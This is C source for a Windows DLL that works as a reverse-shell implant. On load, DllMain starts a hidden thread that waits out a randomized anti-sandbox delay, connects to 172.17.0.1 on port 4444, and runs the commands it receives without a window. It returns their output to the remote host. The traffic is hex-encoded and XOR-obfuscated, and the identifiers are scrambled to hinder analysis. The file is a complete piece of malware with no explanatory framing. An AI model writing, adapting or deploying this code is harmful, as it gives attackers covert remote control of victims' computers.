#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

#define _0xA1 0x3A
#define _0xB1 "172.17.0.1"
#define _0xB2 4444

void _0xC1(char* _0xD1) {
    while (*_0xD1) {
        *_0xD1 ^= _0xA1;
        _0xD1++;
    }
}

void _0xC2(const char* _0xD2, char* _0xD3) {
    char _0xD4[3] = { 0 };
    while (*_0xD2 && *(_0xD2 + 1)) {
        _0xD4[0] = *_0xD2;
        _0xD4[1] = *(_0xD2 + 1);
        *_0xD3++ = (char)strtol(_0xD4, NULL, 16);
        _0xD2 += 2;
    }
    *_0xD3 = '\0';
}

void _0xC3(const char* _0xD5, char* _0xD6) {
    while (*_0xD5) {
        sprintf(_0xD6, "%02x", (unsigned char)*_0xD5);
        _0xD5++;
        _0xD6 += 2;
    }
    *_0xD6 = '\0';
}

DWORD WINAPI _0xC4(LPVOID _0xD7) {
    Sleep(3000 + (rand() % 2000));  // Anti-sandbox randomized delay

    WSADATA _0xE1;
    SOCKET _0xE2;
    struct sockaddr_in _0xE3;
    char _0xE4[4096], _0xE5[2048], _0xE6[4096], _0xE7[8192];

    WSAStartup(MAKEWORD(2, 2), &_0xE1);
    _0xE2 = socket(AF_INET, SOCK_STREAM, 0);

    _0xE3.sin_family = AF_INET;
    _0xE3.sin_port = htons(_0xB2);
    _0xE3.sin_addr.s_addr = inet_addr(_0xB1);

    if (connect(_0xE2, (struct sockaddr*)&_0xE3, sizeof(_0xE3)) != 0) return 1;

    while (1) {
        memset(_0xE4, 0, sizeof(_0xE4));
        memset(_0xE5, 0, sizeof(_0xE5));
        memset(_0xE6, 0, sizeof(_0xE6));
        memset(_0xE7, 0, sizeof(_0xE7));

        if (recv(_0xE2, _0xE4, sizeof(_0xE4), 0) <= 0) break;

        _0xC2(_0xE4, _0xE5);
        _0xC1(_0xE5);

        if (strcmp(_0xE5, "exit") == 0) break;

        // Use CreateProcess + ReadFile instead of _popen
        SECURITY_ATTRIBUTES _0xPA;
        STARTUPINFOA _0xSI;
        PROCESS_INFORMATION _0xPI;
        HANDLE _0xRO, _0xWO;
        DWORD _0xRDB = 0;

        ZeroMemory(&_0xPA, sizeof(_0xPA));
        ZeroMemory(&_0xSI, sizeof(_0xSI));
        ZeroMemory(&_0xPI, sizeof(_0xPI));
        _0xPA.nLength = sizeof(_0xPA);
        _0xPA.bInheritHandle = TRUE;

        CreatePipe(&_0xRO, &_0xWO, &_0xPA, 0);
        SetHandleInformation(_0xRO, HANDLE_FLAG_INHERIT, 0);

        _0xSI.cb = sizeof(_0xSI);
        _0xSI.dwFlags |= STARTF_USESTDHANDLES;
        _0xSI.hStdOutput = _0xWO;
        _0xSI.hStdError = _0xWO;

        if (CreateProcessA(NULL, _0xE5, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &_0xSI, &_0xPI)) {
            CloseHandle(_0xWO);
            ReadFile(_0xRO, _0xE6, sizeof(_0xE6) - 1, &_0xRDB, NULL);
            _0xE6[_0xRDB] = '\0';
            CloseHandle(_0xRO);
            CloseHandle(_0xPI.hProcess);
            CloseHandle(_0xPI.hThread);
        }

        _0xC1(_0xE6);
        _0xC3(_0xE6, _0xE7);
        send(_0xE2, _0xE7, strlen(_0xE7), 0);
    }

    closesocket(_0xE2);
    WSACleanup();
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE _0xF1, DWORD _0xF2, LPVOID _0xF3) {
    if (_0xF2 == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(_0xF1);
        HANDLE _0xF4 = CreateThread(NULL, 0, _0xC4, NULL, 0, NULL);
        if (_0xF4) CloseHandle(_0xF4);
    }
    return TRUE;
}
